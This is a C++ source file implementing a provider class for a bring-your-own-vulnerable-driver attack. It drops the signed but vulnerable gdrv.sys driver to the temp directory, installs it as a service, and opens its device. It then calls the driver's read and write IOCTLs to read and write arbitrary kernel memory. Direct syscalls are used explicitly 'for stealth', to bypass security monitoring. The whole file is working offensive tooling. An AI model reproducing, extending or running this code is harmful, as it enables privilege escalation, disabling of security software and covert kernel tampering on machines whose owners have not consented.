/**
 * @file GdrvProvider.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the GdrvProvider class.
 *
 * Implements the full lifecycle of the gdrv.sys provider, including
 * dropping the driver, creating the service, performing kernel memory
 * operations via its specific IOCTLs, and cleaning up resources. This
 * version has been updated to use direct syscalls for stealth.
 */

#include "GdrvProvider.h"
#include "../Utils.h"
#include "../Syscall.h"
#include <iostream>
#include <fstream>
#include <winternl.h>

// IOCTLs for the vulnerability in gdrv.sys
#define IOCTL_GDRV_READ  0xC3502004
#define IOCTL_GDRV_WRITE 0xC3502008

// External definition for the assembly syscall stub
extern "C" NTSTATUS DoSyscall(DWORD syscallIndex, PVOID * params, ULONG paramCount);

namespace KernelMode {
    namespace Providers {

        GdrvProvider::GdrvProvider() : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr) {}

        GdrvProvider::~GdrvProvider() {
            Deinitialize();
        }

        bool GdrvProvider::DropDriver() {
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            this->driverPath = std::wstring(tempPath) + this->driverFileName;

            std::ifstream src(this->driverFileName, std::ios::binary);
            if (!src) {
                std::wcerr << L"[-] gdrv.sys not found in the current directory." << std::endl;
                std::wcerr << L"[-] Please place gdrv.sys next to the executable." << std::endl;
                return false;
            }
            src.close();

            if (!CopyFileW(this->driverFileName.c_str(), this->driverPath.c_str(), FALSE)) {
                if (GetLastError() != ERROR_FILE_EXISTS) {
                    std::wcerr << L"[-] Failed to copy driver to temporary path: " << GetLastError() << std::endl;
                    return false;
                }
            }
            
            std::wcout << L"[+] Driver placed at: " << this->driverPath << std::endl;
            return true;
        }

        bool GdrvProvider::Initialize() {
            if (!DropDriver()) {
                return false;
            }

            this->serviceHandle = Utils::CreateDriverService(this->serviceName, this->driverPath);
            if (!this->serviceHandle) {
                std::wcerr << L"[-] Failed to create or start the gdrv service." << std::endl;
                DeleteFileW(this->driverPath.c_str());
                return false;
            }

            // Use direct syscall to open a handle to the device
            UNICODE_STRING deviceNameUnicode;
            RtlInitUnicodeString(&deviceNameUnicode, this->deviceName.c_str());
            
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &deviceNameUnicode, OBJ_CASE_INSENSITIVE, NULL, NULL);

            IO_STATUS_BLOCK ioStatusBlock;
            
            DWORD ntCreateFileSyscall = Syscall::GetInstance().GetSyscallIndex("NtCreateFile");
            if (ntCreateFileSyscall == -1) return false;

            PVOID params[] = {
                &this->deviceHandle,
                (PVOID)(GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE),
                &objAttr,
                &ioStatusBlock,
                nullptr,
                (PVOID)FILE_ATTRIBUTE_NORMAL,
                (PVOID)(FILE_SHARE_READ | FILE_SHARE_WRITE),
                (PVOID)FILE_OPEN,
                (PVOID)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
                nullptr,
                (PVOID)0
            };

            NTSTATUS status = DoSyscall(ntCreateFileSyscall, params, 11);

            if (!NT_SUCCESS(status) || this->deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Failed to open a handle to the gdrv device via direct syscall: " << std::hex << status << std::endl;
                Deinitialize();
                return false;
            }

            std::wcout << L"[+] GdrvProvider initialized successfully using direct syscalls." << std::endl;
            return true;
        }

        void GdrvProvider::Deinitialize() {
            if (this->deviceHandle != INVALID_HANDLE_VALUE) {
                DWORD ntCloseSyscall = Syscall::GetInstance().GetSyscallIndex("NtClose");
                if (ntCloseSyscall != -1) {
                    PVOID params[] = { this->deviceHandle };
                    DoSyscall(ntCloseSyscall, params, 1);
                }
                this->deviceHandle = INVALID_HANDLE_VALUE;
            }
            if (this->serviceHandle) {
                Utils::RemoveDriverService(this->serviceHandle);
                this->serviceHandle = nullptr;
            }
            if (!this->driverPath.empty()) {
                DeleteFileW(this->driverPath.c_str());
                this->driverPath.clear();
            }
            std::wcout << L"[+] GdrvProvider deinitialized." << std::endl;
        }

        bool GdrvProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) return false;

            GdrvReadRequest request{};
            request.Address = address;
            request.Size = size;

            IO_STATUS_BLOCK ioStatusBlock;
            DWORD ntDeviceIoControlFileSyscall = Syscall::GetInstance().GetSyscallIndex("NtDeviceIoControlFile");
            if (ntDeviceIoControlFileSyscall == -1) return false;

            PVOID params[] = {
                this->deviceHandle,
                nullptr,
                nullptr,
                nullptr,
                &ioStatusBlock,
                (PVOID)IOCTL_GDRV_READ,
                &request,
                (PVOID)sizeof(request),
                buffer,
                (PVOID)size
            };
            
            NTSTATUS status = DoSyscall(ntDeviceIoControlFileSyscall, params, 10);
            return NT_SUCCESS(status);
        }

        bool GdrvProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) return false;

            std::vector<char> requestBuffer(sizeof(GdrvWriteRequest) + size);
            auto request = reinterpret_cast<GdrvWriteRequest*>(requestBuffer.data());
            request->Address = address;
            request->Size = size;
            memcpy(request->Data, buffer, size);

            IO_STATUS_BLOCK ioStatusBlock;
            DWORD ntDeviceIoControlFileSyscall = Syscall::GetInstance().GetSyscallIndex("NtDeviceIoControlFile");
            if (ntDeviceIoControlFileSyscall == -1) return false;

            PVOID params[] = {
                this->deviceHandle,
                nullptr,
                nullptr,
                nullptr,
                &ioStatusBlock,
                (PVOID)IOCTL_GDRV_WRITE,
                request,
                (PVOID)requestBuffer.size(),
                nullptr,
                (PVOID)0
            };

            NTSTATUS status = DoSyscall(ntDeviceIoControlFileSyscall, params, 10);
            return NT_SUCCESS(status);
        }
    }
}